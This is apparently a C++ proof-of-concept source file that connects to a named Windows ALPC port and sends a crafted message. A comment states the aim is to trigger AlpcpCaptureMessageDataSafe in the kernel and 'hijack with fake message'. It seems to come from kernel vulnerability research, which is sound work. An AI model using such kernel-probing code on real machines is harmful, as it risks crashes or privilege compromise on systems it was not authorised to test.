#include "common.h"

/*!
	\brief				GetProcAddress wrapper for ntdll

	\return				Function pointer if success, NULL if failed
*/
FARPROC GetProcAddrNtdll(LPCSTR FuncName)
{
	auto hNtdll = LoadLibrary(L"ntdll.dll");
	if (hNtdll)
	{
		auto addr = GetProcAddress(hNtdll, FuncName);
		FreeLibrary(hNtdll);
		CloseHandle(hNtdll);
		return addr;
	}
	return NULL;
}

/*!
	\brief				Allocate memory for custom message structure	

	\return				Message pointer if success, NULL if failed
*/
PTALPC_PORTMSG AllocMsg()
{
	PTALPC_PORTMSG Msg;

	auto hProcHeap = GetProcessHeap();
	const auto FullMsgSize = sizeof(TALPC_PORTMSG);
	auto MsgBuffer = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, FullMsgSize);
	if (MsgBuffer)
	{
		Msg = (PTALPC_PORTMSG)MsgBuffer;
		MsgBuffer = nullptr;
		CloseHandle(hProcHeap);
		return Msg;
	}

	CloseHandle(hProcHeap);
	return NULL;
}

/*!
	\brief				Deallocate memory for custom message structure	
*/
void FreeMsg(LPVOID MsgBuffer)
{
	auto hProcHeap = GetProcessHeap();
	HeapFree(hProcHeap, NULL, MsgBuffer);
}

/*!
	\brief				Connect to the ALPC Server port by name

	\param ServerName	ALPC Server port name

	\return				Server handle value if success, NULL if failed
*/
HANDLE Connect(IN LPCWSTR ServerName)
{
	HANDLE hConn;
	UNICODE_STRING PortName;
	NTSTATUS status;
	//OBJECT_ATTRIBUTES oa = {0};
	ULONG BufferLength = sizeof(PORT_MESSAGE);

	RtlInitUnicodeString(&PortName, ServerName);
	//InitializeObjectAttributes(&oa, &PortName, 0, 0, 0);

	auto pfn_NtAlpcConnectPort = reinterpret_cast<NtAlpcConnectPort>(GetProcAddrNtdll("NtAlpcConnectPort"));
	status = pfn_NtAlpcConnectPort(&hConn, &PortName, 0, 0, 0x20000, 0, 0, NULL, 0, 0, 0);
					
	if (!NT_SUCCESS(status))
	{
		printf("NtAlpcConnectPort failed with status = %X\n", status);
		return NULL;
	}

	printf("Connected to Server: %S\n", ServerName);
	return hConn;
}

/*!
	\brief				Send a message to the ALPC Server by it's handle value

	\param hConn		Server port handle returned by Connect function

	\return				STATUS_SUCCESS if successfull
*/
NTSTATUS SendMsg(IN HANDLE hConn)
{
	PPORT_MESSAGE AlpcSendMsg = nullptr;
	PPORT_MESSAGE AlpcRecvMsg = nullptr;
	ALPC_MESSAGE_ATTRIBUTES AlpcSendMsgAttr = {0};
	ALPC_MESSAGE_ATTRIBUTES AlcpRecvMsgAttr = {0};
	ULONG RequiredBuffSize;
	ULONG BufferLength = sizeof(PORT_MESSAGE);
	NTSTATUS status = 0; // assume STATUS_SUCCESS
	
	// Allocate & initialize full message 
	PTALPC_PORTMSG ConnMsg = AllocMsg();
	ConnMsg->Data[0] = 0x4141414141414141;
	ConnMsg->Header.u1.s1.DataLength = sizeof(ConnMsg->Data);
	ConnMsg->Header.u1.s1.TotalLength = sizeof(ConnMsg->Data) + sizeof(ConnMsg->Header);
	// Initialize AlpcSendMsg
	AlpcSendMsg = &ConnMsg->Header;

	// Initialize AlpcSendMsgAttr
	auto pfn_AlpcInitializeMessageAttribute = reinterpret_cast<AlpcInitializeMessageAttribute>(GetProcAddrNtdll("AlpcInitializeMessageAttribute"));
	status = pfn_AlpcInitializeMessageAttribute(ALPC_ATTRFLG_ALLOCATEDATTR, &AlpcSendMsgAttr, /*Reversed test value*/ 0xA0 , &RequiredBuffSize);

	if (!NT_SUCCESS(status))
	{
		printf("AlpcInitializeMessageAttribute failed with status =  %X:\n", status);
		return status;
	}

	// Try to send the message and trigger AlpcpCaptureMessageDataSafe in kernel to hijack with fake message
	auto pfn_NtAlpcSendWaitReceivePort = reinterpret_cast<NtAlpcSendWaitReceivePort>(GetProcAddrNtdll("NtAlpcSendWaitReceivePort"));
	status = pfn_NtAlpcSendWaitReceivePort(hConn, AlpcSendMsgAttr.AllocatedAttributes, AlpcSendMsg, &AlpcSendMsgAttr, NULL, &BufferLength, NULL, NULL);

	if (!NT_SUCCESS(status))
	{
		printf("NtAlpcSendWaitReceivePort failed with status =  %X:\n", status);
		return status;
	}

	FreeMsg(ConnMsg);
	return status;
}
